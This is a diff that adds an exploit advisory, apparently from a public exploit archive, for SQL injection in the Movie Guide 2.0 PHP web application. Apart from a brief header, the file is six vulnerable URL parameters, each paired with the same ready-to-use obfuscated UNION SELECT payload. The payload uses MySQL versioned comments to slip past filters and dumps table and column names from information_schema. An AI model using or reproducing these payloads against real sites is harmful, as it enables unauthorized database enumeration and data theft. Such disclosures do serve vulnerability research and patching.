@@ -1,0 +1,51 @@
+# # # # #
+# Exploit Title: Movie Guide 2.0 - SQL Injection
+# Dork: N/A
+# Date: 15.12.2017
+# Vendor Homepage: http://applebitemedia.com/
+# Software Link: http://applebitemedia.com/amwdl/AM_Movie_Guide.tar.gz
+# Version: 2.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?md=[SQL]
+#  
+# %2dV'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+#  
+# 2)
+# http://localhost/[PATH]/index.php?pid=minfo&Movie_Id=[SQL]
+#  
+# %2dV'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+#  
+# 3)
+# http://localhost/[PATH]/index.php?director=[SQL]
+#  
+# a'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+# 
+# 4)
+# http://localhost/[PATH]/index.php?actor=[SQL]
+#  
+# -a'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+#  
+# 5)
+# http://localhost/[PATH]/index.php?gterm=[SQL]
+#  
+# -a'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+# 
+# 6)
+# http://localhost/[PATH]/index.php?year=[SQL]
+#  
+# -a'%20%20%2f*!02222UNION*%2f(%2f*!02222SELECT*%2f%200x253238253331253239%2c0x253238253332253239%2c(%2f*!02222Select*%2f%20export_set(5%2c@:=0%2c(%2f*!02222select*%2f%20count(*)%2f*!02222from*%2f(information_schema.columns%29where@:=export_set(5%2cexport_set(5%2c@%2c%2f*!02222table_name*%2f%2c0x3c6c693e%2c2)%2c%2f*!02222column_name*%2f%2c0xa3a%2c2))%2c@%2c2))%2c0x253238253334253239%2c0x253238253335253239%2c0x253238253336253239%2c0x253238253337253239%2c0x253238253338253239%2c0x253238253339253239%2c0x253238253331253330253239%2c0x253238253331253331253239%2c0x253238253331253332253239)%2d%2d%20%2d
+# 
+# # # # #
